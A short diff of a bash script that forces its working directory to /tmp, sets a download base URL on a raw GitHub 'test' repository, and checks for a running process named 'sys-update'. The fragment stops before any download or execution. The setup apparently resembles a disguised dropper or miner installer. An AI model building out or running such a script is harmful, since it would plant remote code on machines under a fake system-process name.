@@ -1,12 +1,6 @@
 #!/usr/bin/env bash
 
-HOME_DIR="${HOME_DIR:-${HOME:-/tmp}}"
-[ "$(id -u)" -eq 0 ] && HOME_DIR="/tmp"
-if [ ! -d "$HOME_DIR" ] || [ ! -r "$HOME_DIR" ] || [ ! -w "$HOME_DIR" ] || [ ! -x "$HOME_DIR" ]; then
-    echo "Warning: Cannot access HOME_DIR ('$HOME_DIR'). Setting HOME_DIR to /tmp."
-    HOME_DIR="/tmp"
-fi
-
+HOME_DIR="/tmp"
 BASE_DOWNLOAD_URL="https://raw.githubusercontent.com/t69415778/test/refs/heads/main"
 
 if ps aux | grep '[s]ys-update' &>/dev/null; then
